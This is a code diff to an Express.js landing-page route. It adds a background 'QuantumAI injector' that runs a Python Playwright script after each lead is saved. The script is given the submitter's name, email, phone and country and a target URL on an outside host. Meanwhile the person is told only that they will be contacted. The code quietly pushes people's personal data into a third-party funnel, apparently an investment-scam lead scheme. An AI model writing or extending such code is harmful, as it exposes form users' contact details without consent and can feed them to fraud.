@@ -1,8 +1,84 @@
 const express = require("express");
 const { body, validationResult } = require("express-validator");
+const { spawn } = require("child_process");
+const path = require("path");
 const Lead = require("../models/Lead");
 
 const router = express.Router();
+
+// Function to run the quantumai injector
+const runQuantumAIInjector = async (leadData) => {
+  return new Promise((resolve, reject) => {
+    try {
+      console.log("Starting QuantumAI injector for lead:", leadData.email);
+      
+      // Prepare lead data for the injector
+      const injectorData = {
+        firstName: leadData.firstName,
+        lastName: leadData.lastName,
+        email: leadData.newEmail,
+        phone: leadData.newPhone,
+        country_code: leadData.prefix.replace('+', ''), // Remove + from prefix
+        country: leadData.country,
+        targetUrl: 'https://k8ro.info/bKkkBWkK' // Default QuantumAI URL
+      };
+      
+      // Path to the quantumai injector script
+      const scriptPath = path.join(__dirname, '../../quantumai_injector_playwright.py');
+      
+      // Spawn the Python process
+      const pythonProcess = spawn('python', [scriptPath, JSON.stringify(injectorData)], {
+        cwd: path.join(__dirname, '../..'),
+        stdio: ['pipe', 'pipe', 'pipe']
+      });
+      
+      let stdout = '';
+      let stderr = '';
+      
+      pythonProcess.stdout.on('data', (data) => {
+        const output = data.toString();
+        stdout += output;
+        console.log('QuantumAI Injector:', output.trim());
+      });
+      
+      pythonProcess.stderr.on('data', (data) => {
+        const error = data.toString();
+        stderr += error;
+        console.error('QuantumAI Injector Error:', error.trim());
+      });
+      
+      pythonProcess.on('close', (code) => {
+        console.log(`QuantumAI injector process exited with code ${code}`);
+        
+        if (code === 0) {
+          console.log('✓ QuantumAI injection completed successfully');
+          resolve({ success: true, output: stdout });
+        } else {
+          console.error('✗ QuantumAI injection failed');
+          resolve({ success: false, error: stderr, output: stdout });
+        }
+      });
+      
+      pythonProcess.on('error', (error) => {
+        console.error('Failed to start QuantumAI injector:', error);
+        reject(error);
+      });
+      
+      // Set a timeout for the injection process (5 minutes)
+      setTimeout(() => {
+        if (!pythonProcess.killed) {
+          console.log('QuantumAI injector timeout - killing process');
+          pythonProcess.kill('SIGKILL');
+          resolve({ success: false, error: 'Process timeout' });
+        }
+      }, 300000); // 5 minutes
+      
+    } catch (error) {
+      console.error('Error in runQuantumAIInjector:', error);
+      reject(error);
+    }
+  });
+};
 
 // POST /api/landing - Submit landing page form
 router.post(
@@ -77,12 +153,29 @@ router.post(
       });
 
       const savedLead = await newLead.save();
+      console.log('✓ Lead saved to database:', savedLead._id);
 
+      // Immediately respond to the client
       res.status(201).json({
         success: true,
         message: "Thank you for your submission! We'll be in touch soon.",
         leadId: savedLead._id,
       });
+
+      // Run the QuantumAI injector in the background (don't await)
+      console.log('🚀 Starting QuantumAI injection process...');
+      runQuantumAIInjector(savedLead)
+        .then((result) => {
+          if (result.success) {
+            console.log('✅ QuantumAI injection completed successfully for lead:', savedLead._id);
+          } else {
+            console.error('❌ QuantumAI injection failed for lead:', savedLead._id, result.error);
+          }
+        })
+        .catch((error) => {
+          console.error('💥 QuantumAI injection error for lead:', savedLead._id, error);
+        });
+
     } catch (error) {
       console.error("Landing page submission error:", error);
 
